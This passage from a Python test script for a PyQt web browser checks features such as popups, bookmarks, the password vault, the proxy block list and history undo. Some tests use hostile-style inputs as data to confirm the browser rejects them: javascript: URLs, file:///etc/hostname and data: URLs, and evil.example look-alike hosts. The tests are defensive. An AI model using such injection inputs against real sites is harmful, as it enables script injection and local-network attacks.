           B.MAIN_WORLD_ID)
br.set_site_font_size("127.0.0.1", None); H.spin(300)
check("a site's own text size is used on that site only",
      _fa == "23px" and _fb != "23px", str((_fa, _fb)))
_now_m = B.time.localtime().tm_hour * 60 + B.time.localtime().tm_min
def _look_filter(frm, to):
    pay = dict(br.page_look_payload(), dim=30, warm=0,
               eveFrom=frm % 1440, eveTo=to % 1440)
    H.js(_la, B.PAGE_LOOK_JS.replace("PAYLOAD", json.dumps(pay)),
         B.APP_WORLD_ID)
    return H.js(_la, "document.documentElement.style.filter", B.MAIN_WORLD_ID)
_in = _look_filter(_now_m - 5, _now_m + 5)
_out = _look_filter(_now_m + 10, _now_m + 20)
H.js(_la, B.PAGE_LOOK_JS.replace("PAYLOAD", json.dumps(br.page_look_payload())),
     B.APP_WORLD_ID)
check("the night dimmer is decided by the clock when the page loads",
      "brightness(0.7)" in (_in or "") and "brightness" not in (_out or ""),
      str((_in, _out)))
for _t in (_la, _lb):
    _close_if_open(_t)
H.spin(300)

# ===== batch 38: the lows that touch security and privacy ==============
# a refused popup's row opens web addresses only
_pp = br.new_tab(url=None); H.spin(200)
H.load(_pp, srv.url("/twhome"))
_pop_was = list(getattr(br, "_blocked_popups", []) or [])
br._blocked_popups = [{"url": "file:///etc/hostname"},
                      {"url": "data:text/html,<p>x"},
                      {"url": srv.url("/timers")}]
_pm = br.popup_menu()
_ptexts = [a.text() for a in _pm.actions()]
br._blocked_popups = _pop_was
check("a refused popup's menu offers web addresses only",
      any("/timers" in x for x in _ptexts)
      and not any(x.startswith(("file:", "data:")) for x in _ptexts),
      str(_ptexts))
# the start page links a recent bookmark only when it is a web address
_st = br.new_tab(); H.spin(1200)
H.wait_for(lambda: jsq(_st, "typeof loadExtras", B.MAIN_WORLD_ID)
           == "function", 8000)
_links = H.js(_st, """(function () {
  bridge.startExtras = function (cb) { cb(JSON.stringify({recent: [
    {url: "javascript:window.__ran=1", title: "x"},
    {url: "https://a.example/", title: "a"}]})); };
  loadExtras();
  return JSON.stringify([].map.call(
    document.querySelectorAll('#extras a'), function (a) { return a.href; }));
})()""", B.MAIN_WORLD_ID)
check("the start page links a recent bookmark only if it is a web address",
      _links and json.loads(_links) == ["https://a.example/"], str(_links))
# the player's playlist does not follow the tab to the next page
_pl = br.open_player(["/tmp/review-a.mp4"]); H.spin(1200)
H.load(_pl, srv.url("/fakeplayer")); H.spin(800)
_got = H.js(_pl, "JSON.stringify(window.__got || null)", B.MAIN_WORLD_ID)
check("a page opened after the player is not handed his file paths",
      _got == "null", str(_got))
for _t in (_pp, _st, _pl):
    if _t is not None:
        _close_if_open(_t)
# OCR reads a temporary picture and leaves nothing in the config folder
_od = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_ostub = _od / "tess.sh"
_ostub.write_text('#!/bin/sh\n[ -f "$1" ] && echo "seen $1"\n')
_ostub.chmod(_ostub.stat().st_mode | _stat.S_IEXEC)
_real_rt = br.record_tools
br.record_tools = lambda: {"tesseract": str(_ostub)}
_ocr = {}
_img = B.QImage(40, 20, B.QImage.Format.Format_RGB32); _img.fill(0)
try:
    br.read_text_from_image(image=_img, then=lambda s: _ocr.update(v=s))
    H.wait_for(lambda: "v" in _ocr, 8000)
finally:
    br.record_tools = _real_rt
_opath = str(_ocr.get("v", "")).replace("seen ", "").strip()
check("OCR reads a temporary picture and removes it",
      _opath.startswith(_tempfile.gettempdir()) and not _Path(_opath).exists()
      and not (B.CONFIG_FILE.parent / "ocr-input.png").exists(), str(_ocr))

# ===== batch 39: switching sets / putting all away keeps the window ====
_tw = br.new_window(); H.spin(900)
H.load(_tw.current(), srv.url("/timers")); H.spin(300)
_tw.save_tabset("review-set")
_tw.restore_tabset("review-set", replace=True); H.spin(600)
_tw_ok = False
try:
    _tw_ok = _tw.isVisible() and len(_tw._real_tabs()) >= 1
except RuntimeError:
    _tw_ok = False
check("switching to a saved set in a one-tab window keeps the window",
      _tw_ok)
_aside_n = len(br.aside_sets())
try:
    _tw.set_aside(); H.spin(600)
    _tw_ok2 = _tw.isVisible() and len(_tw._real_tabs()) == 1
except RuntimeError:
    _tw_ok2 = False
check("...and so does putting every tab aside",
      _tw_ok2 and len(br.aside_sets()) == _aside_n + 1)
br.delete_tabset("review-set")
del br.aside_sets()[_aside_n:]
try:
    _tw.close()
except RuntimeError:
    pass
H.spin(400)

# ===== batch 40: Copy on the passwords page copies like a secret =======
if br.vault is not None and not br.vault_locked():
    _ce = br.vault.set_entry("review40.example", "https", "u40", "pw-review-40")
    _cid = (_ce or {}).get("id", "")
    _copied = json.loads(br.bridge.copyField(br._page_key, _cid, "password")
                         or "{}")
    _md = B.QGuiApplication.clipboard().mimeData()
    check("Copy on the passwords page marks the password secret and clears it",
          _copied.get("ok") is True and _md is not None
          and _md.hasFormat("x-kde-passwordManagerHint")
          and getattr(br, "_clip_mine", None) == "pw-review-40",
          str((_copied, _md is not None and list(_md.formats()))))
    B.QGuiApplication.clipboard().clear()
else:
    check("Copy on the passwords page marks the password secret and clears it",
          False, "vault not open in this run")

# ===== batch 42: a fetched TOTP code is asked for once, not every second
if br.vault is not None and not br.vault_locked():
    _tv_calls = []
    _real_tv = br.vault.totp_view
    _real_job = br.vault_job
    br.vault.provider.eager = False      # shadows the class's True
    br.vault.totp_view = lambda item_id: (_tv_calls.append(item_id)
                                          or {"code": "123456", "period": 30,
                                              "left": 20.0})
    _jobs42 = []
    br.vault_job = lambda work, done: _jobs42.append((work, done))
    try:
        _r1 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
        _r2 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
        for _w, _d in _jobs42:
            _d(_w())
        _r3 = json.loads(br.bridge.totpFor(br._page_key, "it42"))
    finally:
        br.vault.totp_view = _real_tv
        br.vault_job = _real_job
        del br.vault.provider.eager
    check("a TOTP code from a slow store is fetched once while it is valid",
          "pending" in _r1 and _r2.get("pending") == _r1.get("pending")
          and _r3.get("code") == "123456" and len(_tv_calls) == 1,
          str((_r1, _r2, _r3, len(_tv_calls))))

# ===== batch 45: stream-safe off gives his settings back after a restart
_ss_was = {k: br.config.get(k, "__absent__")
           for k in ("desktopNotify", "suggestHistory", "streamSafe",
                     "streamSafePrev")}
br.config.update(desktopNotify=True, suggestHistory=True, streamSafe=False)
br.config.pop("streamSafePrev", None)
br.stream_safe(True); br.stream_safe(True)
br._stream_prev = None                       # what a restart forgets
br.stream_safe(False)
_ss_after = (br.config.get("desktopNotify"), br.config.get("suggestHistory"))
for _k, _v in _ss_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("stream-safe off gives notifications and suggestions back, "
      "even after a restart", _ss_after == (True, True), str(_ss_after))

# ===== batch 46: a site's own accessibility switch survives a reload ====
_a11y_was = json.dumps(br.config.get("a11ySites") or {})
br.set_a11y("underlineLinks", True, host="127.0.0.1")
_ua = br.new_tab(url=None); H.spin(200)
H.load(_ua, srv.url("/links")); H.spin(500)
_ub = br.new_tab(url=None); H.spin(200)
H.load(_ub, srv.url("/links").replace("127.0.0.1", "localhost")); H.spin(500)
# the switch's own sheet, not the computed style: a link is underlined
# by default, so "not underlined" on the other host only ever held when
# a site theme had taken the line off within the spin
_dec = lambda v: jsq(v, "[].some.call(document.querySelectorAll('style'),"
                        " function (s) { return s.textContent.indexOf("
                        "'text-decoration: underline !important') >= 0; })"
                        " ? 'underline' : 'none'", B.MAIN_WORLD_ID)
H.wait_for(lambda: _dec(_ua) == "underline", 8000)
H.spin(800)
_da, _db = _dec(_ua), _dec(_ub)
br.config["a11ySites"] = json.loads(_a11y_was)
br.refresh_a11y()
check("a site's own accessibility switch is applied on a fresh load",
      _da == "underline" and _db != "underline", str((_da, _db)))
for _t in (_ua, _ub):
    _close_if_open(_t)
H.spin(300)

# ===== batch 47: live captions record one chunk at a time, and tidy up ==
_lc = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_rec = _lc / "rec.sh"
_rec.write_text('#!/bin/sh\nsleep 1\nhead -c 4000 /dev/zero > "$2"\n')
_wrd = _lc / "words.sh"
_wrd.write_text('#!/bin/sh\necho "some words"\n')
for _f in (_rec, _wrd):
    _f.chmod(_f.stat().st_mode | _stat.S_IEXEC)
_cap_was = {k: br.config.get(k, "__absent__")
            for k in ("captionRecorder", "captionTranscriber")}
br.config["captionRecorder"] = str(_rec)
br.config["captionTranscriber"] = str(_wrd)
_seen_text = []
_real_overlay = br.caption_overlay
br.caption_overlay = lambda text, view=None, clear=False: _seen_text.append(text)
try:
    _t1 = br._caption_tick()
    _t2 = br._caption_tick()
    H.wait_for(lambda: "some words" in _seen_text, 8000)
    _cdir = getattr(br, "_caption_dir", None)
    H.spin(300)
    _left = sorted(p.name for p in _Path(_cdir).glob("*")) if _cdir else ["?"]
    br.live_captions(False)
finally:
    br.caption_overlay = _real_overlay
    for _k, _v in _cap_was.items():
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
check("live captions start no second recorder while one is running",
      _t1 is True and _t2 is False, str((_t1, _t2)))
check("...and each chunk is gone once read, the folder once stopped",
      "some words" in _seen_text and _left == [] and _cdir
      and not _Path(_cdir).exists()
      and not (B.CONFIG_FILE.parent / "caption-chunk.wav").exists(),
      str((_seen_text, _left, _cdir)))

# ===== batch 48: the per-site proxy keeps to the block lists ===========
_rp = B.RuleProxy([], [], ("direct",), blocked=["tracker.example"])
try:
    import socket as _sock
    _c = _sock.create_connection(("127.0.0.1", _rp.port), 5)
    _c.sendall(b"CONNECT cdn.tracker.example:443 HTTP/1.1\r\n\r\n")
    _c.settimeout(5)
    try:
        _ans = _c.recv(200)
    except OSError:
        _ans = b""
    _c.close()
finally:
    _rp.close()
check("the per-site proxy refuses a blocked site and its subdomains",
      _rp.is_blocked("cdn.tracker.example") and not _rp.is_blocked("example")
      and _ans.startswith(b"HTTP/1.1 502"), repr(_ans[:60]))

# ===== batch 49: a bookmark delete can be undone, without losing newer ones
_bm_was = list(br.bookmarks)
br.bookmarks = [{"id": 501, "type": "link", "title": "keep me",
                 "url": "https://keep.example/", "parent": 0}]
br.save_bookmarks()
_gone49 = br.bridge.removeBookmark(br._page_key, 501)
br.bookmarks.append({"id": 502, "type": "link", "title": "new",
                     "url": "https://new.example/", "parent": 0})
_back = br.bridge.undoBookmark(br._page_key)
_after_undo = sorted(b.get("id") for b in br.bookmarks)
_refused = br.bridge.undoBookmark("not-the-key")
_none49 = br.bridge.removeBookmark(br._page_key, 99999)
br.bookmarks = _bm_was
br.save_bookmarks()
check("a deleted bookmark comes back, and one made since stays",
      _gone49 is True and _back == 2 and _after_undo == [501, 502]
      and _refused == 0, str((_gone49, _back, _after_undo, _refused)))
check("...and deleting nothing offers no undo", _none49 is False,
      str(_none49))

# ===== batch 50: an import into a remote store reaches the store ========
class _Lazy50:
    eager = False
    locked = False

    def __init__(self):
        self.stored = []

    def load(self):
        return {"items": [dict(i) for i in self.stored]}

    def put(self, item):
        row = dict(item, id="r%d" % (len(self.stored) + 1))
        self.stored.append(row)
        return {"id": row["id"]}

    def delete(self, item_id):
        return True
_lp = _Lazy50()
_lv = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))),
                      provider=_lp)
_bw = json.dumps({"items": [
    {"type": 1, "name": "a", "login": {"username": "u1", "password": "p1",
                                       "uris": [{"uri": "https://a.example"}]}},
    {"type": 1, "name": "b", "login": {"username": "u2", "password": "p2",
                                       "uris": [{"uri": "https://b.example"}]}}]})
_n50 = _lv.import_bitwarden(_bw)
_lv2 = B.PasswordVault(_lv.meta_file.parent, provider=_lp)
check("a Bitwarden import into a remote store is written to the store",
      _n50 == 2 and len(_lp.stored) == 2 and len(_lv2.items()) == 2,
      str((_n50, len(_lp.stored), len(_lv2.items()))))

# ===== batch 52: an identity fill keeps his name out of the username box
_sg = br.new_tab(url=None); H.spin(200)
H.load(_sg, srv.url("/signup")); H.spin(300)
_idf = {}
br.form_tool("fillident", view=_sg, then=lambda r: _idf.update(v=r),
             arg={"fullname": "Ada Review", "email": "ada@review.example",
                  "phone": "", "street": "", "city": "", "zip": "",
                  "country": ""})
H.wait_for(lambda: "v" in _idf, 5000)
_vals = H.js(_sg, "JSON.stringify(['u','e','n'].map(function (i) {"
                  " return document.getElementById(i).value; }))",
             B.MAIN_WORLD_ID)
check("an identity fill leaves a username box alone and fills the name box",
      _vals and json.loads(_vals) == ["", "ada@review.example", "Ada Review"],
      str(_vals))
_close_if_open(_sg)

# ===== batch 53: small things that were simply wrong ===================
_ics = br.ics_from_text("2026-11-20 23:30") or ""
check("an event at 23:30 with no end ends the next day",
      "DTSTART:20261120T233000" in _ics and "DTEND:20261121T003000" in _ics,
      _ics[:200])
check("the bar's calculator gives no complex answer",
      B._calc_answer("(-8)^0.5") is None and B._calc_answer("9^0.5")
      == ("= 3", "3"), str(B._calc_answer("(-8)^0.5")))
check("an .srt time never has 1000 milliseconds",
      B._srt_time(12.9996) == "00:00:13,000" and B._srt_time(1.5)
      == "00:00:01,500", B._srt_time(12.9996))
check("maxlength=-1 does not cut a generated password to 8",
      br.password_rules_for({"maxlength": -1})["length"] == 20,
      br.password_rules_for({"maxlength": -1}))
class _Desk53:
    def notes(self):
        return [{"t": int(B.time.time())}, {"t": 86400}]

    def todos(self):
        return []
_real_desk53 = br.desk
br.desk = lambda: _Desk53()
try:
    _dl = br.daily_log()
finally:
    br.desk = _real_desk53
check("the daily log counts the notes written today",
      (_dl or {}).get("notes") == 1, str(_dl)[:200])
_sh = br.new_tab(url=None); H.spin(200)
H.load(_sh, srv.url("/shorts/abcdef")); H.spin(300)
_shr = H.js(_sh, B.MEDIA_TOOLS2["shorts"], B.APP_WORLD_ID)
check("the Shorts player leaves another site's /shorts/ page alone",
      _shr == "", str(_shr))
_close_if_open(_sh)

# ===== batch 55: a submenu opened twice lists its rows once ============
_nv55 = br.new_tab(url=None); H.spin(200)
H.load(_nv55, srv.url("/links")); H.spin(300)
_nm = br.nav_menu(view=_nv55)
_info = next((a.menu() for a in _nm.actions()
              if a.menu() is not None
              and a.text() == br._ui_str("navInfoName")), None)
_counts = []
for _round in range(3):
    if _info is not None:
        _info.aboutToShow.emit(); H.spin(600)
        _counts.append(len(_info.actions()))
_dm = br.dev_menu()
_subs = [a.menu() for a in _dm.actions() if a.menu() is not None]
_grow = []
for _s in _subs:
    for _inner in [a.menu() for a in _s.actions() if a.menu() is not None]:
        _inner.aboutToShow.emit(); H.spin(900)
        _n1 = len(_inner.actions())
        _inner.aboutToShow.emit(); H.spin(900)
        if len(_inner.actions()) > _n1:
            _grow.append(_inner.title())
check("the page-info submenu lists its rows once however often it opens",
      len(_counts) == 3 and _counts[0] > 0 and len(set(_counts)) == 1,
      str(_counts))
check("...and no developer submenu grows on a second open", not _grow,
      str(_grow))
_close_if_open(_nv55)

# ===== batch 56: a userscript's @match ignores the port, as Chrome's does
import re as _re56
_m1 = br._plugin_pattern_to_regex("http://localhost/*")
_m2 = br._plugin_pattern_to_regex("https://*.example.com/*")
check("a userscript @match runs on a page with a port",
      _re56.match(_m1, "http://localhost:3000/x")
      and _re56.match(_m2, "https://www.example.com:8443/")
      and not _re56.match(_m1, "http://localhost.evil.example/")
      and not _re56.match(_m1, "http://localhost:3000.evil/"), (_m1, _m2))

# ===== batch 57: the player stops at the end of its queue ==============
_pv57 = br.open_player(); H.spin(1200)
H.wait_for(lambda: jsq(_pv57, "typeof window.__playerLoad",
                        B.MAIN_WORLD_ID) == "function", 8000)
_p57 = H.js(_pv57, """(function () {
  window.__playerLoad(['/tmp/review what?.mp3']);
  var m = document.querySelector('audio, video');
  var url = m ? m.getAttribute('src') : '';
  if (m) m.dispatchEvent(new Event('ended'));
  var after = document.querySelector('audio, video');
  return JSON.stringify([url, after === m]);
})()""", B.MAIN_WORLD_ID)
_p57v = json.loads(_p57 or "[]")
check("the player stops after the last file, and a ? in a name is a name",
      _p57v and "%3F" in _p57v[0] and _p57v[1] is True, str(_p57))
if _pv57 is not None:
    _close_if_open(_pv57)

# ===== batch 58: duplicates per jar, and a tracker strip that keeps the rest
_d1 = br.new_tab(url=None); H.spin(200)
H.load(_d1, srv.url("/twhome"))
_d2 = br.new_tab(private=True); H.spin(200)
H.load(_d2, srv.url("/twhome"))
br.close_duplicate_tabs(); H.spin(300)
check("closing duplicate tabs leaves a private tab's copy alone",
      br.tabs.indexOf(_d1) >= 0 and br.tabs.indexOf(_d2) >= 0)
for _t in (_d1, _d2):
    _close_if_open(_t)
_st58 = B.privacy.strip_tracking(
    "https://x.example/p?q=caf%E9&trkCampaign=1&utm_source=a&a=b+c")
check("a tracker strip keeps every other parameter exactly as written",
      _st58 == "https://x.example/p?q=caf%E9&a=b+c", _st58)

# ===== batch 59: history deletes take what is shown, undo keeps what is new
_hist_was = list(br.history)
_now59 = int(B.time.time())
br.history = [{"url": "https://a.example/1", "title": "a1", "t": _now59 - 50},
              {"url": "https://b.example/1", "title": "b1", "t": _now59 - 40},
              {"url": "https://a.example/2", "title": "a2", "t": _now59 - 30}]
_n59 = br.bridge.deleteHistory(json.dumps({"scoped": True, "q": "",
                                           "host": "a.example",
                                           "since": _now59 - 100,
                                           "until": _now59, "noise": True}))
_left59 = [e["url"] for e in br.history]
check("deleting a range with a site typed in takes only that site's rows",
      _n59 == 2 and _left59 == ["https://b.example/1"], str((_n59, _left59)))
br.history.append({"url": "https://c.example/new", "title": "c",
                   "t": _now59 - 5})
br.undo_history_delete()
_back59 = sorted(e["url"] for e in br.history)
check("...and its undo puts them back without losing a page visited since",
      _back59 == ["https://a.example/1", "https://a.example/2",
                  "https://b.example/1", "https://c.example/new"],
      str(_back59))
br._history_undo_at = B.time.monotonic() - 3600
br.delete_history_entries(["https://c.example/new"])
br._history_undo_at = B.time.monotonic() - 3600
check("...and an undo long after the delete does nothing",
      br.undo_history_delete() == 0
      and "https://c.example/new" not in [e["url"] for e in br.history])
br.history = _hist_was
br.save_history()

# ===== batch 60: a note's link and tags can be emptied; a due text kept ==
_nd60 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_dk60 = B.notes.Desk(_nd60)
_n60 = _dk60.save_note(None, "Plan", "body", "https://x.example/", ["a", "b"])
_dk60.save_note(_n60["id"], body="kept link")
_kept60 = _dk60.note(_n60["id"])
_dk60.save_note(_n60["id"], "Plan", "emptied", "", [])
_empt60 = _dk60.note(_n60["id"])
check("a note keeps its link when only the body changes, and can be emptied",
      _kept60["link"] == "https://x.example/" and _kept60["tags"] == ["a", "b"]
      and _empt60["link"] == "" and _empt60["tags"] == [],
      str((_kept60.get("link"), _empt60.get("link"), _empt60.get("tags"))))
(_nd60 / "todo.md").write_text("- [ ] a (due: tomorrow)\n- [ ] b\n")
_dk60.toggle_todo(1)
check("a to-do's unreadable due text survives ticking another one",
      "(due: tomorrow)" in (_nd60 / "todo.md").read_text(),
      (_nd60 / "todo.md").read_text())

# ===== batch 61: two filter lists with one file name keep two files =====
_nm61 = br._ad_list_names(["https://a.example/lists/filters.txt",
                           "https://b.example/filters.txt",
                           "https://c.example/easylist.txt"])
check("two filter lists both called filters.txt are kept in two files",
      len(set(_nm61)) == 3 and _nm61[0] == "filters.txt"
      and _nm61[2] == "easylist.txt", str(_nm61))

# ===== batch 62: a privacy file is taken only in the shapes it is read in
_pf = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))) / "privacy.json"
_pv_was = {k: br.config.get(k, "__absent__")
           for k in ("permissions", "guardOff", "blockHosts", "httpsOnly")}
_pf.write_text(json.dumps({"permissions": ["a"], "guardOff": ["b"],
                           "blockHosts": ["ok.example"], "httpsOnly": True}))
_taken62 = br.import_privacy(str(_pf))
_shape62 = (type(br.config.get("permissions", {})).__name__,
            type(br.config.get("guardOff", {})).__name__,
            br.config.get("blockHosts"))
for _k, _v in _pv_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.refresh_guard_scripts()
check("a privacy file with a list where a table belongs is not taken",
      _taken62 == 2 and _shape62[0] == "dict" and _shape62[1] == "dict"
      and _shape62[2] == ["ok.example"], str((_taken62, _shape62)))

# ===== batch 63: a mod jar with an odd fabric.mod.json is read, not raised
import zipfile as _zip63
_jd = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_odd = []
for _n, _body in (("list.jar", b"[]"), ("deps.jar", b'{"id":"x","depends":["a"]}')):
    with _zip63.ZipFile(str(_jd / _n), "w") as _z:
        _z.writestr("fabric.mod.json", _body)
    try:
        _odd.append(br.mod_info(str(_jd / _n)))
    except Exception as _e:
        _odd.append(repr(_e))
check("a mod jar whose fabric.mod.json is a list, or lists its depends, "
      "is read", all(isinstance(x, dict) for x in _odd)
      and _odd[1].get("id") == "x", str(_odd))

# ===== batch 64/65: Ctrl+Enter leaves a search alone; the pad poll returns
br.urlbar.setText("hello world")
from PyQt6.QtGui import QKeyEvent as _QKE
_ce = _QKE(B.QEvent.Type.KeyPress, B.Qt.Key.Key_Return,
           B.Qt.KeyboardModifier.ControlModifier)
_navs = []
_real_nav = br._navigate
br._navigate = lambda *a, **k: _navs.append(br.urlbar.text())
try:
    br.eventFilter(br.urlbar, _ce)
    br.urlbar.setText("python")
    br.eventFilter(br.urlbar, _ce)
finally:
    br._navigate = _real_nav
check("Ctrl+Enter finishes one word into a domain and leaves a phrase alone",
      _navs == ["hello world", "www.python.com"], str(_navs))
br.urlbar.setText("")
br.config["gamepadOn"] = True
_gw = br.new_window(); H.spin(800)
_gt = getattr(_gw, "_pad_timer", None)
_g_on = _gt is not None and _gt.isActive()
br.config["gamepadOn"] = False
try:
    if _gt is not None:
        _gt.stop()
    _gw.close()
except RuntimeError:
    pass
H.spin(300)
check("a controller switched on last time is polled from the start", _g_on)

# ===== batch 66: switching Do Not Disturb off says what was held ========
_dnd_was = br.config.get("dndUntil", 0)
_flashes66 = []
_real_flash66 = br.flash
br.flash = lambda text, *a, **k: _flashes66.append(str(text))
try:
    br.config["dndUntil"] = int(B.time.time()) + 600
    br._held_notifications = [{"origin": "a", "title": "t"}] * 3
    br.do_not_disturb()
    H.wait_for(lambda: not br._held_notifications, 4000)
finally:
    br.flash = _real_flash66
    br.config["dndUntil"] = _dnd_was
check("switching Do Not Disturb off says how many notifications it held",
      not br._held_notifications
      and any(f == br._ui_str("dndHeld") % 3 for f in _flashes66),
      str(_flashes66))

# ===== batch 67: a video's place is kept under its own address ==========
_mp = br.new_tab(url=None); H.spin(200)
H.load(_mp, srv.url("/twhome")); H.spin(300)
_places_was = json.dumps(br.media_places())
_a67 = B.clean_url(srv.url("/videoA"))
_mp._media_url = _a67
_mp._media_loading = False           # a same-page move, as pushState is
_real_mt2 = br.media_tool2
br.media_tool2 = lambda name, view=None, then=None, arg=None: then(
    json.dumps({"at": 600, "duration": 3600}))
try:
    br.note_media_place(_mp)
finally:
    br.media_tool2 = _real_mt2
_tbl67 = dict(br.media_places())
_b67 = B.clean_url(_mp.url().toString())
br.media_places().clear()
br.media_places().update(json.loads(_places_was))
check("after a same-page move the place is kept for the video he left",
      (_tbl67.get(_a67) or {}).get("at") == 600 and _b67 not in _tbl67,
      str(list(_tbl67)[:4]))
_close_if_open(_mp)

# ===== batch 68: a capture cut at its limit ends with the right band ====
_bv = br.new_tab(url=None); H.spin(200)
H.load(_bv, srv.url("/bands")); H.spin(500)
_inner = H.js(_bv, "window.innerHeight", B.APP_WORLD_ID) or 0
_lim = (_inner * 3) + 250 if _inner else 0
_img68 = B.capture.full_page(_bv, B.APP_WORLD_ID, settle=60, limit=_lim) \
    if _lim else None
_ok68, _got68 = False, None
if _img68 is not None and not _img68.isNull():
    _sc = _img68.height() / float(_lim)
    _px = _img68.pixelColor(5, int((_lim - 20) * _sc))
    _got68 = _px.name()
    # the band at limit-20 is band number (lim-20)//100: red if even
    _even = ((_lim - 20) // 100) % 2 == 0
    # by which colour wins, not by value: site theming may darken them
    _ok68 = (_px.red() > _px.blue() + 40) if _even \
        else (_px.blue() > _px.red() + 40)
check("a capture cut at its limit ends with the content above the limit",
      _ok68, str((_inner, _lim, _got68)))
_close_if_open(_bv)

# ===== batch 69: a clip is dropped by name, whatever was copied since ===
_cd69 = B.notes.Desk(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_cd69.add_clip("first"); _cd69.add_clip("second")
_row_of_first = [c["text"] for c in _cd69.clips()].index("first")
_cd69.add_clip("third")                       # copied while the list showed
_cd69.drop_clip(_cd69.clip_index(_row_of_first, "first"))
check("dropping a clip takes that clip even after a new one was copied",
      [c["text"] for c in _cd69.clips()] == ["third", "second"],
      str([c["text"] for c in _cd69.clips()]))

# ===== batch 70: a bare host name is the home network ==================
check("a bare host name counts as the home network, as promised",
      B.privacy.is_local("router") and B.privacy.is_local("nas.lan")
      and B.privacy.is_local("fritz.box") and B.privacy.is_local("3232235777")
      and not B.privacy.is_local("example.com")
      and not br.is_local_address("router"))
_ok70, _u70 = B.privacy.check_request({"blockLocal": True}, B.QUrl("http://router/"),
                                      B.QUrl("https://evil.example/"))
check("...so a web page cannot send a frame at http://router/", _ok70 is False)

# ===== batch 71: an address with :// in its query can be a bookmark ======
check("a bookmark address with :// in its query is taken",
      B._clean_bookmark_url("example.com/go?to=https://other.org")
      == "https://example.com/go?to=https://other.org"
      and B._clean_bookmark_url("javascript:alert(1)") == ""
      and B._clean_bookmark_url("https://a.example/") == "https://a.example/",
      B._clean_bookmark_url("example.com/go?to=https://other.org"))

# ===== batch 72: a rule set for a parent domain can be switched off below
_ns_was = list(br.config.get("noScriptSites") or [])
br.config["noScriptSites"] = ["example.com"]
_on_before = br.site_rule_on("noScriptSites", "docs.example.com")
_after = br.toggle_site_rule("noScriptSites", "docs.example.com")
_on_now = br.site_rule_on("noScriptSites", "docs.example.com")
br.config["noScriptSites"] = _ns_was
br._reapply_site_rules()
check("a site rule set for example.com can be switched off from docs.example.com",
      _on_before and _after is False and not _on_now,
      str((_on_before, _after, _on_now)))

# ===== batch 73: an unsaved on-by-default switch goes off in one click ===
_rl_was = br.config.get("readlineKeys", "__absent__")
br.config.pop("readlineKeys", None)
_rl = br.set_flag("readlineKeys", default=True)
if _rl_was == "__absent__":
    br.config.pop("readlineKeys", None)
else:
    br.config["readlineKeys"] = _rl_was
check("readline keys, on by default and never saved, go off in one click",
      _rl is False, str(_rl))

# ===== batch 74: one odd stored box name does not stop the others ========
_fh = br.new_tab(url=None); H.spin(200)
H.load(_fh, srv.url("/formhist")); H.spin(300)
_fhr = {}
br.form_tool("suggest", view=_fh, then=lambda r: _fhr.update(v=r),
             arg={"input:2": ["x"], "it's": ["y"], "city": ["Berlin"]})
H.wait_for(lambda: "v" in _fhr, 5000)
_lst = H.js(_fh, "document.getElementById('c').getAttribute('list') || ''",
            B.MAIN_WORLD_ID)
check("an odd stored box name does not stop suggestions for the next box",
      bool(_lst), str((_fhr, _lst)))
_close_if_open(_fh)

# ===== batch 75: a tooltip shows "&" as "&", and markup as text ==========
from PyQt6.QtWidgets import QLabel as _QL75
from PyQt6.QtGui import QTextDocument as _QTD75
_lb75 = _QL75()
B.set_plain(_lb75, "x", tooltip="a&b <i>c</i>.pdf")
_doc75 = _QTD75()
_doc75.setHtml(_lb75.toolTip())
check("a tooltip shows an & and a tag as the characters they are",
      _doc75.toPlainText().strip() == "a&b <i>c</i>.pdf",
      repr(_doc75.toPlainText()))

# ===== batch 76: the cookie-banner starter leaves other "accept" buttons =
_cb = br.new_tab(url=None); H.spin(200)
H.load(_cb, srv.url("/accepts")); H.spin(300)
H.js(_cb, B.STARTER_PLUGINS["cookie-away"][2], B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_cb, "window.__clicked.length", B.MAIN_WORLD_ID)
           >= 1, 6000)
H.spin(1500)
_clicked76 = H.js(_cb, "JSON.stringify(window.__clicked)", B.MAIN_WORLD_ID)
check("the cookie-banner plugin clicks the banner's button and nothing else",
      _clicked76 == '["banner"]', str(_clicked76))
_close_if_open(_cb)

# ===== batch 77: the developer menu has a row of its own in the palette ==
_strs77 = [r["str"] for r in br.actions_list() if r["id"] == "devmenu"]
_shared77 = [r["id"] for r in br.actions_list()
             if _strs77 and r["str"] == _strs77[0]]
check("the developer menu's palette row is not hidden behind the inspector's",
      _shared77 == ["devmenu"], str(_shared77))

# ===== batch 78: merging duplicate bookmarks keeps one per browser ======
_bm78 = list(br.bookmarks)
br.bookmarks = [
    {"id": 801, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 1, "sid": "work"},
    {"id": 802, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 2},
    {"id": 803, "type": "link", "title": "x", "url": "https://dup.example/",
     "parent": 0, "t": 3}]
_g78 = br.merge_duplicate_bookmarks()
_ids78 = sorted(b["id"] for b in br.bookmarks)
br.bookmarks = _bm78
br.save_bookmarks()
check("merging duplicates keeps one per virtual browser",
      _g78 == 1 and _ids78 == [801, 802], str((_g78, _ids78)))

# ===== batch 79: a 1Password edit empties only what he emptied =========
_cur79 = {"title": "t", "fields": [{"id": "username", "value": "bob"},
                                   {"id": "password", "value": "pw"},
                                   {"id": "totp", "value": "SEED"},
                                   {"id": "notesPlain", "value": "my note"}],
          "urls": [{"href": "https://a.example/login?x=1", "primary": True},
                   {"href": "https://b.example/"}]}
# a summary row after _normalize: every box present, most of them ""
_it79 = {"type": "login", "id": "abc", "remote": True, "username": "",
         "password": "", "totp": "", "note": "", "host": "a.example",
         "scheme": "https", "title": "t2"}
_keep79 = B.OnePasswordProvider._merged(
    _cur79, _it79, B.OnePasswordProvider._fields_for(_it79))
